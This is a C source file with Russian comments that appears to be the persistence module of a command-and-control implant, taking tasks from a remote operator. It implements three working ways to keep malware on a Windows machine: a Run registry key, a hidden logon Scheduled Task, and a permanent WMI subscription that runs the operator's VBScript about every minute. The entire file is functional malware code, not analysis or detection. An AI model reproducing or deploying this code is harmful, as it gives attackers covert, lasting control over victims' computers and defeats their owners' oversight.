// cmd_persist.c — закрепление в системе:
//
//   OP_PERSIST_REG  {name utf8, path utf8}
//       Записывает REG_SZ в HKCU\Software\Microsoft\Windows\CurrentVersion\Run
//       — автозапуск при входе текущего пользователя.
//
//   OP_PERSIST_TASK {name utf8, path utf8}
//       Создаёт Scheduled Task через ITaskService COM API — триггер logon,
//       запускается от имени текущего пользователя без повышения привилегий.
//
//   OP_PERSIST_WMI  {name utf8, script utf8, [interval uint32 = 60]}
//       WMI event subscription:
//         __EventFilter              (ROOT\subscription) — WQL poll Win32_LocalTime
//         ActiveScriptEventConsumer  (ROOT\subscription) — выполняет VBScript оператора
//         __FilterToConsumerBinding                     — связывает их
//       Триггер: __InstanceModificationEvent WITHIN <interval> WHERE Second=5 (~раз в минуту).
//       Требует повышения привилегий (Local Admin).
//
// Требует: advapi32, ole32, oleaut32 (уже линкуются),
//          taskschd.h, wbemidl.h (Windows SDK),
//          wbemuuid.lib — auto-linked через #pragma comment в wbemidl.h.

#include <windows.h>
#include <oaidl.h>
#include <oleauto.h>
#include <taskschd.h>
#include <wbemidl.h>
#include "../core/beacon.h"

static void out_str(const char* s) { out_write(s, rt_strlen(s)); }

// Вывод HRESULT / DWORD в шестнадцатеричном виде без CRT.
static void out_hex32(DWORD v) {
    static const char hx[] = "0123456789abcdef";
    char buf[11];
    int i = 0;
    buf[i++] = '0'; buf[i++] = 'x';
    int started = 0;
    for (int s = 28; s >= 0; s -= 4) {
        unsigned char n = (unsigned char)((v >> s) & 0xF);
        if (n || started || s == 0) { buf[i++] = hx[n]; started = 1; }
    }
    buf[i] = '\0';
    out_str(buf);
}

// ---- OP_PERSIST_REG --------------------------------------------------------

void cmd_persist_reg(const BeaconTask* t) {
    char name_u8[256]  = {0};
    char path_u8[2048] = {0};

    kv_get_str(t->pay, t->pay_len, "name", name_u8, sizeof(name_u8));
    kv_get_str(t->pay, t->pay_len, "path", path_u8, sizeof(path_u8));

    if (!name_u8[0] || !path_u8[0]) {
        out_str("[!] persist_reg: name and path required\n");
        return;
    }

    WCHAR name_w[256]  = {0};
    WCHAR path_w[2048] = {0};
    MultiByteToWideChar(CP_UTF8, 0, name_u8, -1, name_w, 256);
    MultiByteToWideChar(CP_UTF8, 0, path_u8, -1, path_w, 2048);

    HKEY hKey = NULL;
    LONG rv = RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);

    if (rv != ERROR_SUCCESS) {
        out_str("[!] persist_reg: RegOpenKeyEx failed: ");
        out_hex32((DWORD)rv);
        out_str("\n");
        return;
    }

    DWORD cbPath = (DWORD)((rt_wstrlen(path_w) + 1) * sizeof(WCHAR));
    rv = RegSetValueExW(hKey, name_w, 0, REG_SZ, (const BYTE*)path_w, cbPath);
    RegCloseKey(hKey);

    if (rv == ERROR_SUCCESS) {
        out_str("[+] Registry Run key set: ");
        out_str(name_u8);
        out_str(" = ");
        out_str(path_u8);
        out_str("\n");
    } else {
        out_str("[!] persist_reg: RegSetValueEx failed: ");
        out_hex32((DWORD)rv);
        out_str("\n");
    }
}

// ---- OP_PERSIST_TASK -------------------------------------------------------

// CLSID и IID Task Scheduler определяем вручную, чтобы не линковаться
// с taskschd.lib / mstask.lib (которых нет в стандартном no-CRT наборе).
static const CLSID s_CLSID_TaskScheduler =
    {0x0F87369F,0xA4E5,0x4CFC,{0xBD,0x3E,0x73,0xE6,0x15,0x45,0x72,0xDD}};
static const IID s_IID_ITaskService =
    {0x2FABA4C7,0x4DA9,0x4013,{0x96,0x97,0xC0,0xBE,0x84,0xDE,0xAF,0x35}};
static const IID s_IID_IExecAction =
    {0x4C3D624D,0xFD6B,0x49A3,{0xB9,0xB7,0x09,0xCB,0x3C,0xD3,0xF0,0x47}};

void cmd_persist_task(const BeaconTask* t) {
    char name_u8[256]  = {0};
    char path_u8[2048] = {0};

    kv_get_str(t->pay, t->pay_len, "name", name_u8, sizeof(name_u8));
    kv_get_str(t->pay, t->pay_len, "path", path_u8, sizeof(path_u8));

    if (!name_u8[0] || !path_u8[0]) {
        out_str("[!] persist_task: name and path required\n");
        return;
    }

    WCHAR name_w[256]  = {0};
    WCHAR path_w[2048] = {0};
    MultiByteToWideChar(CP_UTF8, 0, name_u8, -1, name_w, 256);
    MultiByteToWideChar(CP_UTF8, 0, path_u8, -1, path_w, 2048);

    // COM-инициализация: RPC_E_CHANGED_MODE означает уже инициализирован в другом apartment.
    HRESULT hrInit = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    BOOL bUninit = (hrInit != RPC_E_CHANGED_MODE && SUCCEEDED(hrInit));

    HRESULT hr;
    ITaskService* pSvc    = NULL;
    ITaskFolder*  pFolder = NULL;
    ITaskDefinition* pTask = NULL;
    IRegisteredTask* pRegTask = NULL;

    hr = CoCreateInstance(&s_CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                          &s_IID_ITaskService, (void**)&pSvc);
    if (FAILED(hr) || !pSvc) {
        out_str("[!] persist_task: CoCreateInstance(TaskScheduler) failed: ");
        out_hex32((DWORD)hr);
        out_str("\n");
        goto done;
    }

    {
        VARIANT v; v.vt = VT_EMPTY;
        hr = pSvc->lpVtbl->Connect(pSvc, v, v, v, v);
    }
    if (FAILED(hr)) {
        out_str("[!] persist_task: ITaskService::Connect failed: ");
        out_hex32((DWORD)hr);
        out_str("\n");
        goto done;
    }

    {
        BSTR bsRoot = SysAllocString(L"\\");
        hr = pSvc->lpVtbl->GetFolder(pSvc, bsRoot, &pFolder);
        SysFreeString(bsRoot);
    }
    if (FAILED(hr) || !pFolder) {
        out_str("[!] persist_task: GetFolder failed: ");
        out_hex32((DWORD)hr);
        out_str("\n");
        goto done;
    }

    hr = pSvc->lpVtbl->NewTask(pSvc, 0, &pTask);
    if (FAILED(hr) || !pTask) {
        out_str("[!] persist_task: NewTask failed: ");
        out_hex32((DWORD)hr);
        out_str("\n");
        goto done;
    }

    // Principal — текущий пользователь, без повышения привилегий.
    {
        IPrincipal* pPrin = NULL;
        pTask->lpVtbl->get_Principal(pTask, &pPrin);
        if (pPrin) {
            pPrin->lpVtbl->put_LogonType(pPrin, TASK_LOGON_INTERACTIVE_TOKEN);
            pPrin->lpVtbl->put_RunLevel(pPrin, TASK_RUNLEVEL_LUA);
            pPrin->lpVtbl->Release(pPrin);
        }
    }

    // Settings: скрытое задание, запускать даже если пропустили по времени.
    {
        ITaskSettings* pSet = NULL;
        pTask->lpVtbl->get_Settings(pTask, &pSet);
        if (pSet) {
            pSet->lpVtbl->put_Hidden(pSet, VARIANT_TRUE);
            pSet->lpVtbl->put_StartWhenAvailable(pSet, VARIANT_TRUE);
            pSet->lpVtbl->put_DisallowStartIfOnBatteries(pSet, VARIANT_FALSE);
            pSet->lpVtbl->put_StopIfGoingOnBatteries(pSet, VARIANT_FALSE);
            pSet->lpVtbl->Release(pSet);
        }
    }

    // Триггер: вход в систему (logon).
    {
        ITriggerCollection* pTriggers = NULL;
        pTask->lpVtbl->get_Triggers(pTask, &pTriggers);
        if (pTriggers) {
            ITrigger* pTrig = NULL;
            pTriggers->lpVtbl->Create(pTriggers, TASK_TRIGGER_LOGON, &pTrig);
            if (pTrig) pTrig->lpVtbl->Release(pTrig);
            pTriggers->lpVtbl->Release(pTriggers);
        }
    }

    // Действие: запуск исполняемого файла.
    {
        IActionCollection* pActions = NULL;
        pTask->lpVtbl->get_Actions(pTask, &pActions);
        if (pActions) {
            IAction* pAct = NULL;
            pActions->lpVtbl->Create(pActions, TASK_ACTION_EXEC, &pAct);
            if (pAct) {
                IExecAction* pExec = NULL;
                pAct->lpVtbl->QueryInterface(pAct, &s_IID_IExecAction, (void**)&pExec);
                if (pExec) {
                    BSTR bsPath = SysAllocString(path_w);
                    pExec->lpVtbl->put_Path(pExec, bsPath);
                    SysFreeString(bsPath);
                    pExec->lpVtbl->Release(pExec);
                }
                pAct->lpVtbl->Release(pAct);
            }
            pActions->lpVtbl->Release(pActions);
        }
    }

    // Регистрируем задание.
    {
        BSTR bsName = SysAllocString(name_w);
        VARIANT vEmpty; vEmpty.vt = VT_EMPTY;
        hr = pFolder->lpVtbl->RegisterTaskDefinition(
            pFolder, bsName, pTask,
            TASK_CREATE_OR_UPDATE,
            vEmpty, vEmpty,
            TASK_LOGON_INTERACTIVE_TOKEN,
            vEmpty,
            &pRegTask);
        SysFreeString(bsName);
    }

    if (SUCCEEDED(hr)) {
        out_str("[+] Scheduled task registered: ");
        out_str(name_u8);
        out_str(" -> ");
        out_str(path_u8);
        out_str("\n");
    } else {
        out_str("[!] persist_task: RegisterTaskDefinition failed: ");
        out_hex32((DWORD)hr);
        out_str("\n");
    }

done:
    if (pRegTask) pRegTask->lpVtbl->Release(pRegTask);
    if (pTask)    pTask->lpVtbl->Release(pTask);
    if (pFolder)  pFolder->lpVtbl->Release(pFolder);
    if (pSvc)     pSvc->lpVtbl->Release(pSvc);
    if (bUninit)  CoUninitialize();
}

// ---- OP_PERSIST_WMI --------------------------------------------------------
//
// WMI event subscription (ROOT\subscription):
//   1. __EventFilter              — WQL: Win32_LocalTime, WITHIN <interval>
//   2. ActiveScriptEventConsumer  — VBScript из параметра 'script'
//   3. __FilterToConsumerBinding  — связывает 1 и 2
//
// Создаёт постоянную подписку: срабатывает ~раз в <interval> секунд
// даже без входа пользователя (WMI-сервис запущен всегда).
// Требует: Local Admin (запись в ROOT\subscription требует SeSecurityPrivilege).

// CLSID и IID определяем сами, чтобы не зависеть от wbemuuid.lib напрямую.
// Если wbemidl.h уже включил pragma comment — lib всё равно подтянется,
// и наши static const просто не будут видны за пределами TU (internal linkage).
static const CLSID s_CLSID_WbemLocator =
    {0x4590F811,0x1D3A,0x11D0,{0x89,0x1F,0x00,0xAA,0x00,0x4B,0x2E,0x24}};
static const IID   s_IID_IWbemLocator  =
    {0xDC12A687,0x737F,0x11CF,{0x88,0x4D,0x00,0xAA,0x00,0x4B,0x2E,0x24}};

// Append wide string src to dst buffer of capacity cap, tracking offset *n.
static void wcat(WCHAR* dst, size_t cap, size_t* n, const WCHAR* src) {
    size_t i = *n, j = 0;
    while (src[j] && i + 1 < cap) dst[i++] = src[j++];
    dst[i] = 0;
    *n = i;
}

// Append decimal uint32 to wide buffer.
static void wcat_u32(WCHAR* dst, size_t cap, size_t* n, UINT32 v) {
    WCHAR tmp[12]; int m = 0;
    if (!v) { tmp[m++] = L'0'; }
    else {
        UINT32 x = v;
        while (x) { tmp[m++] = (WCHAR)(L'0' + x % 10); x /= 10; }
        // reverse
        for (int a = 0, b = m - 1; a < b; a++, b--) {
            WCHAR t = tmp[a]; tmp[a] = tmp[b]; tmp[b] = t;
        }
    }
    tmp[m] = 0;
    wcat(dst, cap, n, tmp);
}

// Connect to a WMI namespace; sets impersonation blanket. Returns NULL on error.
static IWbemServices* wmi_connect_ns(IWbemLocator* pLoc, const WCHAR* ns) {
    IWbemServices* pSvc = NULL;
    BSTR bsNs = SysAllocString(ns);
    HRESULT hr = pLoc->lpVtbl->ConnectServer(
        pLoc, bsNs, NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
    SysFreeString(bsNs);
    if (FAILED(hr) || !pSvc) return NULL;
    CoSetProxyBlanket((IUnknown*)pSvc,
        RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL, EOAC_NONE);
    return pSvc;
}

// GetObject(class) → SpawnInstance → return instance. Caller releases.
static IWbemClassObject* wmi_spawn_inst(IWbemServices* pSvc, const WCHAR* cls) {
    IWbemClassObject* pClass = NULL;
    BSTR bsCls = SysAllocString(cls);
    HRESULT hr = pSvc->lpVtbl->GetObject(pSvc, bsCls, 0, NULL, &pClass, NULL);
    SysFreeString(bsCls);
    if (FAILED(hr) || !pClass) return NULL;
    IWbemClassObject* pInst = NULL;
    pClass->lpVtbl->SpawnInstance(pClass, 0, &pInst);
    pClass->lpVtbl->Release(pClass);
    return pInst;
}

// Set a VT_BSTR property on a WMI class object.
static HRESULT wmi_put_str(IWbemClassObject* pObj,
                           const WCHAR* prop, const WCHAR* val) {
    VARIANT v; VariantInit(&v);
    v.vt = VT_BSTR;
    v.bstrVal = SysAllocString(val);
    HRESULT hr = pObj->lpVtbl->Put(pObj, prop, 0, &v, 0);
    VariantClear(&v);
    return hr;
}

void cmd_persist_wmi(const BeaconTask* t) {
    char   name_u8[256]    = {0};
    char   script_u8[4096] = {0};
    UINT32 interval        = 60;

    kv_get_str(t->pay, t->pay_len, "name",   name_u8,   sizeof(name_u8));
    kv_get_str(t->pay, t->pay_len, "script", script_u8, sizeof(script_u8));
    kv_get_u32(t->pay, t->pay_len, "interval", &interval);
    if (!interval) interval = 60;

    if (!name_u8[0] || !script_u8[0]) {
        out_str("[!] persist_wmi: name and script required\n");
        return;
    }

    WCHAR name_w[256]    = {0};
    WCHAR script_w[4096] = {0};
    MultiByteToWideChar(CP_UTF8, 0, name_u8,   -1, name_w,   256);
    MultiByteToWideChar(CP_UTF8, 0, script_u8, -1, script_w, 4096);

    HRESULT hrInit = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    BOOL    bUninit = (hrInit != RPC_E_CHANGED_MODE && SUCCEEDED(hrInit));

    IWbemLocator*  pLoc = NULL;
    IWbemServices* pSub = NULL;
    HRESULT        hr;

    hr = CoCreateInstance(&s_CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                          &s_IID_IWbemLocator, (void**)&pLoc);
    if (FAILED(hr) || !pLoc) {
        out_str("[!] persist_wmi: CoCreateInstance(WbemLocator) failed: ");
        out_hex32((DWORD)hr); out_str("\n");
        goto wmi_done;
    }

    pSub = wmi_connect_ns(pLoc, L"ROOT\\subscription");
    if (!pSub) {
        out_str("[!] persist_wmi: ConnectServer(ROOT\\subscription) failed\n");
        goto wmi_done;
    }

    // ---- 1. __EventFilter --------------------------------------------------
    // Query: SELECT * FROM __InstanceModificationEvent WITHIN <interval>
    //        WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 5
    // EventNamespace: ROOT\CIMV2 (где живёт Win32_LocalTime)
    {
        WCHAR query[512] = {0};
        size_t qn = 0;
        wcat(query, 512, &qn,
            L"SELECT * FROM __InstanceModificationEvent WITHIN ");
        wcat_u32(query, 512, &qn, interval);
        wcat(query, 512, &qn,
            L" WHERE TargetInstance ISA 'Win32_LocalTime'"
            L" AND TargetInstance.Second = 5");

        IWbemClassObject* pFlt = wmi_spawn_inst(pSub, L"__EventFilter");
        if (!pFlt) {
            out_str("[!] persist_wmi: spawn __EventFilter failed\n");
            goto wmi_done;
        }
        wmi_put_str(pFlt, L"Name",           name_w);
        wmi_put_str(pFlt, L"QueryLanguage",  L"WQL");
        wmi_put_str(pFlt, L"Query",          query);
        wmi_put_str(pFlt, L"EventNamespace", L"ROOT\\CIMV2");

        hr = pSub->lpVtbl->PutInstance(pSub, pFlt,
                                       WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
        pFlt->lpVtbl->Release(pFlt);
        if (FAILED(hr)) {
            out_str("[!] persist_wmi: PutInstance(__EventFilter) failed: ");
            out_hex32((DWORD)hr); out_str("\n");
            goto wmi_done;
        }
    }

    // ---- 2. ActiveScriptEventConsumer --------------------------------------
    // ScriptingEngine = VBScript; ScriptText = оператор передаёт сам.
    {
        IWbemClassObject* pCons = wmi_spawn_inst(pSub, L"ActiveScriptEventConsumer");
        if (!pCons) {
            out_str("[!] persist_wmi: spawn ActiveScriptEventConsumer failed\n");
            goto wmi_done;
        }
        wmi_put_str(pCons, L"Name",            name_w);
        wmi_put_str(pCons, L"ScriptingEngine", L"VBScript");
        wmi_put_str(pCons, L"ScriptText",      script_w);

        hr = pSub->lpVtbl->PutInstance(pSub, pCons,
                                       WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
        pCons->lpVtbl->Release(pCons);
        if (FAILED(hr)) {
            out_str("[!] persist_wmi: PutInstance(ActiveScriptEventConsumer) failed: ");
            out_hex32((DWORD)hr); out_str("\n");
            goto wmi_done;
        }
    }

    // ---- 3. __FilterToConsumerBinding -------------------------------------
    // Filter   ref: "__EventFilter.Name=\"<name>\""
    // Consumer ref: "ActiveScriptEventConsumer.Name=\"<name>\""
    {
        WCHAR flt_path[384]  = {0};
        WCHAR cons_path[384] = {0};
        size_t fn = 0, cn = 0;

        wcat(flt_path,  384, &fn, L"__EventFilter.Name=\"");
        wcat(flt_path,  384, &fn, name_w);
        wcat(flt_path,  384, &fn, L"\"");

        wcat(cons_path, 384, &cn, L"ActiveScriptEventConsumer.Name=\"");
        wcat(cons_path, 384, &cn, name_w);
        wcat(cons_path, 384, &cn, L"\"");

        IWbemClassObject* pBind = wmi_spawn_inst(pSub, L"__FilterToConsumerBinding");
        if (!pBind) {
            out_str("[!] persist_wmi: spawn __FilterToConsumerBinding failed\n");
            goto wmi_done;
        }
        wmi_put_str(pBind, L"Filter",   flt_path);
        wmi_put_str(pBind, L"Consumer", cons_path);

        hr = pSub->lpVtbl->PutInstance(pSub, pBind,
                                       WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
        pBind->lpVtbl->Release(pBind);
        if (FAILED(hr)) {
            out_str("[!] persist_wmi: PutInstance(__FilterToConsumerBinding) failed: ");
            out_hex32((DWORD)hr); out_str("\n");
            goto wmi_done;
        }
    }

    // ---- успех -------------------------------------------------------------
    out_str("[+] WMI subscription created:\n");
    out_str("    Filter:   __EventFilter.Name=");
    out_str(name_u8); out_str("\n");
    out_str("    Consumer: ActiveScriptEventConsumer.Name=");
    out_str(name_u8); out_str("\n");
    out_str("    Query:    Win32_LocalTime WITHIN ");
    {
        // print interval decimal without CRT
        char ibuf[12] = {0}; int in2 = 0; UINT32 iv = interval;
        char itmp[12]; int im = 0;
        if (!iv) itmp[im++] = '0';
        else { UINT32 x = iv; while(x){ itmp[im++]=(char)('0'+x%10); x/=10; }
               for(int a=0,b=im-1;a<b;a++,b--){char tc=itmp[a];itmp[a]=itmp[b];itmp[b]=tc;} }
        itmp[im] = 0;
        while (itmp[in2]) ibuf[in2] = itmp[in2++];
        out_str(ibuf);
    }
    out_str("s\n");
    out_str("    Note: requires Local Admin; WMI svc executes script every ~interval s\n");

wmi_done:
    if (pSub) pSub->lpVtbl->Release(pSub);
    if (pLoc) pLoc->lpVtbl->Release(pLoc);
    if (bUninit) CoUninitialize();
}
